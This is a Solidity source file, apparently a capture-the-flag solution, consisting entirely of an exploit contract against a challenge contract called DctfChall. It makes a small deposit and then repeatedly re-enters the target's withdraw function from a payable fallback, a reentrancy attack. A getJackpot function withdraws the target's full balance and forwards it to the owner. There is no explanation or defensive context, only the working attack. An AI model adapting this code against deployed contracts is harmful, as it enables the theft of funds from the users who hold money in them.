// https://pastebin.com/KXAuwRXS

pragma solidity ^0.4.4;

import "../contracts/DctfChall.sol";

contract DctfExploit {

  DctfChall public dctf;
  address owner;
  bool public performAttack = false;

  function DctfExploit(DctfChall addr, address _owner){
    owner = _owner;
    dctf = addr;
  }

  function attack()  {
    performAttack = true;
    dctf.invest.value(1)(this);
    dctf.withdraw(1);
  }

  function getBalance() returns (uint256) {
    return this.balance;
  }

  function getJackpot(){
    dctf.withdraw(dctf.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
  }

  function() payable {
    if (performAttack) {
      performAttack = false;
      dctf.withdraw(1);
    }
  }
}
